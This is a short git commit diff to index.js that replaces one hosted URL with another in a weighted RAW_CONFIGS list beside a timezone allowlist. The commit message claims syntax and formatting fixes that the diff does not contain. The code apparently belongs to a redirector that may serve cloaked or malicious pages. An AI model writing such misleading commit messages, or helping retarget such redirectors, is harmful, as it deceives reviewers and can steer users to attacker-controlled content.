92f36f1f6ce0278cdf43bbd58eb14efc32eb7c01
paalakash <palaksh452@gmail.com>
2026-06-29 14:31:30 +0530

    Fix syntax and formatting in index.js
    Corrected syntax errors and improved formatting in the RAW_CONFIGS array.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seashell-app-r7hlk.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://dolphin-app-2-paj4r.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
